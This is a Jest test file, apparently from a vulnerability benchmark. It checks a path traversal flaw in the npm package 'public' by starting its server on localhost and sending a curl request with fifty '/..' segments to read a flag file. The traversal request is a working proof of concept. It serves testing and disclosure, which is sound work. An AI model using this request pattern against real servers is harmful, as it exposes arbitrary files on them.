const v26 = require('child_process');
var execSync = v26.execSync;
const v28 = () => {
    try {
        const v27 = execSync('fuser -k 3000/tcp');
        v27;
    } catch (e) {
    }
};
const v29 = afterAll(v28);
v29;
const path = require('path');
const v30 = require('sleep');
const sleep = v30.sleep;
const pathToFlag = path.resolve(__dirname, '../flag.html');
const genstr = function (n) {
    const v31 = '/..'.repeat(50);
    const v32 = v31 + pathToFlag;
    return v32;
};
const v49 = done => {
    const v33 = expect.assertions(1);
    v33;
    const fs = require('fs');
    const sleep = require('sleep');
    const v34 = require('child_process');
    const exec = v34.exec;
    const v35 = fs.readFileSync(pathToFlag);
    let hostsFile = v35.toString();
    const a = require('child_process');
    try {
        const v36 = () => {
        };
        const v37 = a.execSync('fuser -k 3000/tcp', v36);
        v37;
    } catch (e) {
    }
    let server = 'node ./node_modules/public/bin/public';
    const v38 = (error, stdout) => {
    };
    const v39 = exec(server, v38);
    v39;
    const v40 = sleep.sleep(2);
    v40;
    const v41 = genstr();
    let attack_string = `curl -v --path-as-is "http://127.0.0.1:3000${ v41 }"`;
    const v47 = (error, stdout) => {
        let out = false;
        const v42 = stdout.includes(hostsFile);
        if (v42) {
            out = true;
        }
        const v43 = console.log(stdout);
        v43;
        const v44 = expect(out);
        const v45 = v44.toBe(true);
        v45;
        const v46 = done();
        v46;
    };
    const v48 = exec(attack_string, v47);
    v48;
};
const v50 = test('Path Traversal in public', v49);
v50;